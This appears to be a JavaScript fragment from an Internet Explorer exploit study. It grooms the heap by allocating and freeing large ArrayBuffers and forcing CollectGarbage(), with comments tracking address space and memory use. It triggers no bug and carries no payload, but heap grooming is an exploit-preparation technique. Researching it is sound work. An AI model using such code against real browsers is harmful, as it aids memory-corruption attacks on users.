var aiAllocationSizes = [             // max address ------.    .---- RAM allocated
      -0x4000, //  4000                                      4000  4000
       0x1000, //    |   1000                                5000  5000
      -0x5000, // -4000    |   5000                          a000  6000
       0x5000, //          |     |   5000                    f000  b000
      -0x7000, //          |  -5000    |   7000             16000  d000
       0x6000, //          |           |     |   6000       1c000 13000
      -0x8000, //          |           |  -7000    |   8000 24000 14000 (5.3Gb)
    ];
    var aoHeap = [],
        oToBeFreed;
    aiAllocationSizes.forEach(function (iAllocationSize) {
      if (iAllocationSize < 0 && oToBeFreed) {
        console.log("-0x" + oToBeFreed.byteLength.toString(16));
        oToBeFreed = null; // Free the heap block that was queued to be freed.
        CollectGarbage();
      }
      var uAllocationSize = Math.abs(iAllocationSize) * 0x10000 - 1;
      console.log("+0x" + uAllocationSize.toString(16));
      var oArrayBuffer = new ArrayBuffer(uAllocationSize);
      if (iAllocationSize < 0) {
        oToBeFreed = oArrayBuffer; // Schedule this to be freed
      } else {
        //ao­Heap.push(o­Array­Buffer);
      }
    });
